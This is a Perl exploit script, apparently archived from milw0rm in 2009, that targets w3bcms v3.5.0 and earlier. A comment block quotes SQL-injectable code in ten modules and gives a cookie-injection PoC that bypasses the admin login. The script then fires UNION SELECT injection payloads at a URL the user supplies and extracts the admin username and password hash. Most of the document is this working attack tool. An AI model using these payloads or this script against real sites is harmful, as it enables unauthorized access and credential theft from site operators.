<html><head><title>w3bcms <= v3.5.0 Multiple Remote Vulnerabilities Exploit</title></head><pre>#!/usr/bin/perl
use LWP::UserAgent;
use HTTP::Request::Common qw(POST);
use Getopt::Long;

#                            \#'#/
#                            (-.-)
#    -------------------oOO---(_)---OOo------------------
#    |           __             __                      |
#    |     _____/ /_____ ______/ /_  __  ______ ______  |
#    |    / ___/ __/ __ `/ ___/ __ \/ / / / __ `/ ___/  |
#    |   (__  ) /_/ /_/ / /  / /_/ / /_/ / /_/ (__  )   |
#    |  /____/\__/\__,_/_/  /_.___/\__,_/\__, /____/    |
#    |  Security Research Division      /____/ 2oo9     |
#    ----------------------------------------------------
#    | w3bcms &lt;= v3.5.0 Multiple Remote Vulnerabilities |
#    |        (requires magic_quotes_gpc = Off)         |
#    ----------------------------------------------------
# [!] Discovered.: DNX
# [!] Vendor.....: http://www.w3bcms.de
# [!] Detected...: 11.01.2009
# [!] Reported...: 17.01.2009
# [!] Response...: 19.01.2009
#
# [!] Background.: CMS features in the frontend:
#                  » Ausgabe angelegter Seiten
#                  » Integrierter sicherer Spamschutz (kein Captcha!)
#                  » CMS Features wie Slogan Rotation, Datumausgabe, Seitenanzeige
#                  » Integrierter Besuchercounter (versteckt/sichtbar)
#               &lt;b&gt;» Sicherheit gegen Hackangriffe&lt;/b&gt;
#                  » Schnelle Datenbankabfragen
#                  » 100% Suchmaschinenoptimiert (SEO)
#                  » Erweiterbar durch Module &amp; Addons
#                  » Unterstützt Mod Rewrite URL's (optional)
#
#
# [!] Info.......: Insecure Cookie Handling in Admin Backend Login
# [!] Bug........: $_COOKIE[&quot;cms_admin&quot;] in admin/index.php near line 67
#
#                  67: if ($_COOKIE[&quot;cms_admin&quot;] != &quot;&quot;) {
#                  68: 
#                  69:         $admin = mysql_fetch_assoc(mysql_query(&quot;SELECT * FROM admin WHERE cookie='&quot;.$_COOKIE[&quot;cms_admin&quot;].&quot;'&quot;));
#                  70: 
#                  71:         if ($admin['benutzername'] != &quot;&quot;) {
#                  72: 
#                  73:                 $_SESSION['login'] = true;
#                  74:                 header(&quot;Location: inc/index.php?seite=uebersicht&quot;);
#                  75:                 exit;
#                  76: 
#                  77:         }
#                  78: 
#                  79: }
#
# [!] PoC........: javascript:document.cookie = &quot;cms_admin=' or '1'='1; path=/&quot;;
#
#
# [!] Info.......: Downloads module v1.5.0
# [!] Bug........: $_GET['id'] in includes/module/downloads/index.inc.php near line 15
#
#                  15: if (isset($_GET['action']) &amp;&amp; $_GET['action'] == &quot;klick&quot;) {
#                  16: 
#                  17:         $data = mysql_fetch_assoc(mysql_query(&quot;SELECT * FROM modul_downloads WHERE id='&quot;.$_GET['id'].&quot;'&quot;));
#                  18:         mysql_query(&quot;UPDATE modul_downloads SET klicks=klicks+1 WHERE id='&quot;.$_GET['id'].&quot;'&quot;);
#                  19:         $url = preg_replace('(%PAGE_DIR%)', $settings['page_dir'], $data['url']);
#                  20:         header(&quot;Location: &quot;.$url.&quot;&quot;);
#                  21:         exit;
#                  22: 
#                  23: }
#
#
# [!] Info.......: News module v1.5.0
# [!] Bug........: $_GET['action'] in includes/module/news/index.inc.php near line 131
#
#                  131: $kcheck = eregi (&quot;kommentar&quot;, $_GET['action']);
#
#                  135: if ($kcheck == &quot;1&quot;) {
#                  136: 
#                  137:         $str = $_GET['action'];
#                  138:         $explode = explode(&quot;.&quot;,$str);
#                  139: 
#                  140:         $ausgabe = mysql_fetch_assoc(mysql_query(&quot;SELECT * FROM modul_news WHERE id='&quot;.$explode[0].&quot;' AND status='0'&quot;));
#
#
# [!] Info.......: Portfolio module v2.0.0
# [!] Bug........: $_GET['action'] in includes/module/portfolio/index.inc.php near line 75
#
#                  75: $kcheck = eregi (&quot;show&quot;, $_GET['action']);
#                  76: 
#                  77: if ($kcheck == &quot;1&quot;) {
#                  78: 
#                  79:         $str = $_GET['action'];
#                  80:         $explode = explode(&quot;.&quot;,$str);
#                  81: 
#                  82:         $ausgabe = mysql_fetch_assoc(mysql_query(&quot;SELECT * FROM modul_portfolio WHERE id='&quot;.$explode[0].&quot;'&quot;));
#
#
# [!] Info.......: Partner module v1.5.0
# [!] Bug........: $_GET['id'] in includes/module/partner/index.inc.php near line 15
#
#                  15: if (isset($_GET['action']) &amp;&amp; $_GET['action'] == &quot;klick&quot;) {
#                  16: 
#                  17:         $data = mysql_fetch_assoc(mysql_query(&quot;SELECT * FROM modul_partner WHERE id='&quot;.$_GET['id'].&quot;'&quot;));
#                  18:         mysql_query(&quot;UPDATE modul_partner SET klicks=klicks+1 WHERE id='&quot;.$_GET['id'].&quot;'&quot;);
#                  19: 
#                  20:         header(&quot;Location: &quot;.$data['url'].&quot;&quot;);
#                  21:         exit;
#                  22: 
#                  23: }
#
#
# [!] Info.......: Mediathek module v1.5.0
# [!] Bug........: $_GET['id'] in includes/module/mediathek/index.inc.php near line 15
#
#                  15: if (isset($_GET['action']) &amp;&amp; $_GET['action'] == &quot;klick&quot;) {
#                  16: 
#                  17:         $data = mysql_fetch_assoc(mysql_query(&quot;SELECT * FROM modul_mediathek WHERE id='&quot;.$_GET['id'].&quot;'&quot;));
#                  18:         mysql_query(&quot;UPDATE modul_mediathek SET klicks=klicks+1 WHERE id='&quot;.$_GET['id'].&quot;'&quot;);
#                  19: 
#                  20:         $mediafile = $settings['page_dir'].&quot;/includes/media/&quot;.$data['mediafile'];
#                  21:
#                  22:         header(&quot;Location: &quot;.$mediafile.&quot;&quot;);
#                  23:         exit;
#                  24:
#                  25: }
#
#
# [!] Info.......: Sitemap module v1.5.0
# [!] Bug........: $_GET['seite'] in includes/module/sitemap/index.inc.php near line 15
#
#                  15: $explode = explode(&quot;.&quot;,$_GET['seite']);
#
#                  19: $menu = mysql_query(&quot;SELECT * FROM pages WHERE submenu='0' AND aktiv='0' AND hidden='0' AND id!='&quot;.$explode['0'].&quot;' ORDER by sortierung&quot;);
#
#
# [!] Info.......: Links module v1.5.0
# [!] Bug........: $_GET['id'] in includes/module/links/index.inc.php near line 15
#
#                  15: if (isset($_GET['action']) &amp;&amp; $_GET['action'] == &quot;klick&quot;) {
#                  16: 
#                  17:         $data = mysql_fetch_assoc(mysql_query(&quot;SELECT * FROM modul_links WHERE id='&quot;.$_GET['id'].&quot;'&quot;));
#                  18:         mysql_query(&quot;UPDATE modul_links SET klicks=klicks+1 WHERE id='&quot;.$_GET['id'].&quot;'&quot;);
#                  19:         header(&quot;Location: &quot;.$data['url'].&quot;&quot;);
#                  20:         exit;
#                  21: 
#                  22: }
#
#
# [!] Info.......: Blog module v1.5.0
# [!] Bug........: $_GET['action'] in includes/module/blog/index.inc.php near line 133
#
#                  131: $kcheck = eregi (&quot;kommentar&quot;, $_GET['action']);
#
#                  135: if ($kcheck == &quot;1&quot;) {
#                  136: 
#                  137:         $str = $_GET['action'];
#                  138:         $explode = explode(&quot;.&quot;,$str);
#                  139: 
#                  140:         $ausgabe = mysql_fetch_assoc(mysql_query(&quot;SELECT * FROM modul_blog WHERE id='&quot;.$explode[0].&quot;' AND status='0'&quot;));
#
#
# [!] Info.......: Suche module v1.5.0
# [!] Bug........: $_POST['suchbegriff'] in includes/module/suche/index.inc.php near line 66
#
#                  66: $eingabe = trim(strip_tags($_POST['suchbegriff']));
#                  67: $eingabe_array = explode(&quot; &quot;, $eingabe);
#                  68: $eingabe_array = array_unique($eingabe_array);
#                  69: 
#                  70: if ($eingabe == &quot;&quot; || $_POST['suchbegriff'] == &quot;Suchbegriff(e) ...&quot;){
#                  71: 
#                  72:         echo &quot;&lt;p&gt;Fehler - Bitte &lt;b&gt;mindestens ein Suchbegriff&lt;/b&gt; eingegeben!&lt;/p&gt;&quot;;
#                  73: 
#                  74: } else {
#                  
#                  78:         $query_pages = &quot;SELECT id, titel, inhalt, page FROM pages WHERE &quot;;
#                  79: 
#                  80:         for ($i=0; $i&lt;count($eingabe_array); $i++) {
#                  81: 
#                  82:                 $query_pages .= &quot;((titel LIKE '%&quot; . $eingabe_array[$i] . &quot;%') OR (inhalt LIKE '%&quot; . $eingabe_array[$i] . &quot;%'))&quot;;
#                  83: 
#                  84:                 if ($i&lt;count($eingabe_array)-1){
#                  85: 
#                  86:                         $query_pages .= &quot; AND &quot;;
#                  87: 
#                  88:                 }
#                  89: 
#                  90:                 $query_pages .= &quot;AND type!='modul' AND type!='extern' AND inhalt!='' AND aktiv='0'&quot;;
#                  91: 
#                  92:         }
#                  93: 
#                  94:         $num_rows_pages = @mysql_num_rows(mysql_query($query_pages));
#                  95:         $result_pages = @mysql_query($query_pages);
#
#
# [!] Info.......: Gallery module v1.5.0
# [!] Bug........: $_GET['action'] in includes/module/gallery/index.inc.php near line 314
#
#                  314: } else if ($locate == &quot;1&quot; &amp;&amp; isset($_GET['action']) &amp;&amp; isset($_GET['id']) &amp;&amp; $_GET['id'] != &quot;&quot;) {
#                  
#                  320:         $explode = explode(&quot;.&quot;,$_GET['action']);
#                  
#                  324:         $album = mysql_query(&quot;SELECT * FROM modul_gallery WHERE album_id='&quot;.$explode[0].&quot;' ORDER by id &quot;.$sqlorder.&quot; LIMIT $zeige,$trefferproseite&quot;);
#
#
# [!] Solution...: Upgrade to v3.5.1 or higher and update all modules
#

if(!$ARGV[2])
{
  print &quot;\n                          \\#'#/                       &quot;;
  print &quot;\n                          (-.-)                        &quot;;
  print &quot;\n   ------------------oOO---(_)---OOo-------------------&quot;;
  print &quot;\n   | w3bcms &lt;= v3.5.0 Multiple Remote Vulnerabilities |&quot;;
  print &quot;\n   |                  coded by DNX                    |&quot;;
  print &quot;\n   ----------------------------------------------------&quot;;
  print &quot;\n[!] Usage: perl w3blabor.pl [Target] &lt;Options&gt;&quot;;
  print &quot;\n[!] Example: perl w3blabor.pl -1 -u \&quot;http://127.0.0.1/w3b/index.php?seite=2.down&amp;action=klick&amp;id=1\&quot;&quot;;
  print &quot;\n[!] Targets:&quot;;
  print &quot;\n       -1              Exploit over Downloads module v1.5.0&quot;;
  print &quot;\n       -2              Exploit over News module v1.5.0&quot;;
  print &quot;\n       -3              Exploit over Portfolio module v2.0.0&quot;;
  print &quot;\n       -4              Exploit over Partner module v1.5.0&quot;;
  print &quot;\n       -5              Exploit over Mediathek module v1.5.0&quot;;
  print &quot;\n       -6              Exploit over Sitemap module v1.5.0&quot;;
  print &quot;\n       -7              Exploit over Links module v1.5.0&quot;;
  print &quot;\n       -8              Exploit over Blog module v1.5.0&quot;;
  print &quot;\n       -9              Exploit over Suche module v1.5.0&quot;;
  print &quot;\n       -10             Exploit over Gallery module v1.5.0&quot;;
  print &quot;\n[!] Options:&quot;;
  print &quot;\n       -u [url]        URL to vuln website&quot;;
  print &quot;\n       -p [ip:port]    Proxy support&quot;;
  print &quot;\n&quot;;
  exit;
}

my $ua       = LWP::UserAgent-&gt;new();
my $response = &quot;&quot;;
my %options  = ();
GetOptions(\%options, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;, &quot;10&quot;, &quot;u=s&quot;, &quot;p=s&quot;);

if($options{&quot;p&quot;}) { $ua-&gt;proxy('http', &quot;http://&quot;.$options{&quot;p&quot;}); }

if($options{&quot;1&quot;}) { use_download_bug(); }
elsif($options{&quot;2&quot;}) { use_news_bug(); }
elsif($options{&quot;3&quot;}) { use_portfolio_bug(); }
elsif($options{&quot;4&quot;}) { use_partner_bug(); }
elsif($options{&quot;5&quot;}) { use_mediathek_bug(); }
elsif($options{&quot;6&quot;}) { use_sitemap_bug(); }
elsif($options{&quot;7&quot;}) { use_links_bug(); }
elsif($options{&quot;8&quot;}) { use_blog_bug(); }
elsif($options{&quot;9&quot;}) { use_suche_bug(); }
elsif($options{&quot;10&quot;}) { use_gallery_bug(); }

sub use_download_bug
{
  my $url_user = $options{&quot;u&quot;};
  my $url_pass = $options{&quot;u&quot;};
  my $exploit_user = &quot;id='%20union%20select 1,2,benutzername,4,5%20from%20admin%20limit%201/*&quot;;
  my $exploit_pass = &quot;id='%20union%20select 1,2,passwort,4,5%20from%20admin%20limit%201/*&quot;;
  
  $url_user =~ s/id=\d+/$exploit_user/i;
  $response = $ua-&gt;get($url_user);
  $response-&gt;base =~ /.*\/(.*?)$/;
  my $user = $1;
  
  $url_pass =~ s/id=\d+/$exploit_pass/i;
  $response = $ua-&gt;get($url_pass);
  $response-&gt;base =~ /.*\/(.*?)$/;
  my $pass = $1;  
  
  print $user.&quot;:&quot;.$pass;
}

sub use_news_bug
{
  my $url = $options{&quot;u&quot;};
  my $exploit = &quot;action='%20union%20select%201,2,3,4,benutzername,6,passwort%20from%20admin%20limit%201/*&quot;;
  $url =~ s/action=\d+/$exploit/i;
  $response = $ua-&gt;get($url);
  if($response-&gt;content =~ /&lt;p class=&quot;titel&quot;&gt;(.*?)&lt;\/p&gt;.*([a-fA-F0-9]{32})&lt;\/div&gt;/s)
  {
    print $1.&quot;:&quot;.$2;
  }
}

sub use_portfolio_bug
{
  my $url = $options{&quot;u&quot;};
  my $exploit = &quot;action='%20union%20select%201,2,passwort,benutzername,5,6,7,8,9,10,11,12,13,14,15,16%20from%20admin%20limit 1/*&quot;;
  $url =~ s/action=\d+/$exploit/i;
  $response = $ua-&gt;get($url);
  if($response-&gt;content =~ /&lt;h1&gt;([a-fA-F0-9]{32})&lt;\/h1&gt;.*?&lt;p align=&quot;justify&quot;&gt;(.*?)&lt;\/p&gt;/s)
  {
    print $2.&quot;:&quot;.$1;
  }
}

sub use_partner_bug
{
  my $url_user = $options{&quot;u&quot;};
  my $url_pass = $options{&quot;u&quot;};
  my $exploit_user = &quot;id='%20union%20select 1,2,benutzername,4,5%20from%20admin%20limit%201/*&quot;;
  my $exploit_pass = &quot;id='%20union%20select 1,2,passwort,4,5%20from%20admin%20limit%201/*&quot;;
  
  $url_user =~ s/id=\d+/$exploit_user/i;
  $response = $ua-&gt;get($url_user);
  $response-&gt;base =~ /.*\/(.*?)$/;
  my $user = $1;
  
  $url_pass =~ s/id=\d+/$exploit_pass/i;
  $response = $ua-&gt;get($url_pass);
  $response-&gt;base =~ /.*\/(.*?)$/;
  my $pass = $1;  
  
  print $user.&quot;:&quot;.$pass;
}

sub use_mediathek_bug
{
  my $url_user = $options{&quot;u&quot;};
  my $url_pass = $options{&quot;u&quot;};
  my $exploit_user = &quot;id='%20union%20select 1,2,benutzername,4%20from%20admin%20limit%201/*&quot;;
  my $exploit_pass = &quot;id='%20union%20select 1,2,passwort,4%20from%20admin%20limit%201/*&quot;;
  
  $url_user =~ s/id=\d+/$exploit_user/i;
  $response = $ua-&gt;get($url_user);
  $response-&gt;base =~ /.*\/(.*?)$/;
  my $user = $1;
  
  $url_pass =~ s/id=\d+/$exploit_pass/i;
  $response = $ua-&gt;get($url_pass);
  $response-&gt;base =~ /.*\/(.*?)$/;
  my $pass = $1;  
  
  print $user.&quot;:&quot;.$pass;
}

sub use_sitemap_bug
{
  my $url = $options{&quot;u&quot;};
  $url =~ /seite=(\d+)\./;
  my $id = $1;
  my $exploit = &quot;seite=&quot;.$id.&quot;'%20union%20select%201,benutzername,passwort,4,5,6,7,8,9,10,11,12,13,14,15%20from%20admin%20/*&quot;;
  $url =~ s/seite=\d+/$exploit/i;
  $response = $ua-&gt;get($url);
  if($response-&gt;content =~ /&lt;strong&gt;$id\.&lt;\/strong&gt;.*?&lt;a href=&quot;index\.php\?seite=1\.(.*?)&quot; title=&quot;(.*?)&quot;/s)
  {
    print $1.&quot;:&quot;.$2;
  }
}

sub use_links_bug
{
  my $url_user = $options{&quot;u&quot;};
  my $url_pass = $options{&quot;u&quot;};
  my $exploit_user = &quot;id='%20union%20select 1,2,benutzername,4,5%20from%20admin%20limit%201/*&quot;;
  my $exploit_pass = &quot;id='%20union%20select 1,2,passwort,4,5%20from%20admin%20limit%201/*&quot;;
  
  $url_user =~ s/id=\d+/$exploit_user/i;
  $response = $ua-&gt;get($url_user);
  $response-&gt;base =~ /.*\/(.*?)$/;
  my $user = $1;
  
  $url_pass =~ s/id=\d+/$exploit_pass/i;
  $response = $ua-&gt;get($url_pass);
  $response-&gt;base =~ /.*\/(.*?)$/;
  my $pass = $1;  
  
  print $user.&quot;:&quot;.$pass;
}

sub use_blog_bug
{
  my $url = $options{&quot;u&quot;};
  my $exploit = &quot;action='%20union%20select%201,2,3,4,benutzername,6,passwort%20from%20admin%20limit%201/*&quot;;
  $url =~ s/action=\d+/$exploit/i;
  $response = $ua-&gt;get($url);
  if($response-&gt;content =~ /&lt;p class=&quot;titel&quot;&gt;(.*?)&lt;\/p&gt;.*([a-fA-F0-9]{32})&lt;\/div&gt;/s)
  {
    print $1.&quot;:&quot;.$2;
  }
}

sub use_suche_bug
{
  my $url = $options{&quot;u&quot;}.&quot;&amp;action=senden&quot;;
  my $search = &quot;###___###%'))/**/union/**/select/**/1,benutzername,passwort,4/**/from/**/admin/*&quot;;
  my $req = POST $url, [suchbegriff =&gt; $search];
  my $response = $ua-&gt;request($req);
  
  if($response-&gt;content =~ /.*&quot;&gt;(.*?)&lt;\/a&gt;&lt;br \/&gt;([a-fA-F0-9]{32}) \[/s)
  {
    print $1.&quot;:&quot;.$2;
  }
}

sub use_gallery_bug
{
  my $url = $options{&quot;u&quot;};
  my $exploit = &quot;action='%20union%20select%201,2,passwort,4,benutzername,6%20from%20admin/*&quot;;
  $url =~ s/action=\d+/$exploit/i;
  $response = $ua-&gt;get($url);
  my @content = split(/\n/, $response-&gt;content);
  foreach (@content)
  {
    if($_ =~ /\/([a-fA-F0-9]{32})&quot; rel=&quot;lytebox\[.*?\]&quot; title=&quot;(.*?)&quot;/)
    {
      print $2.&quot;:&quot;.$1.&quot;\n&quot;;
    }
  }
}

# milw0rm.com [2009-02-09]</pre></html>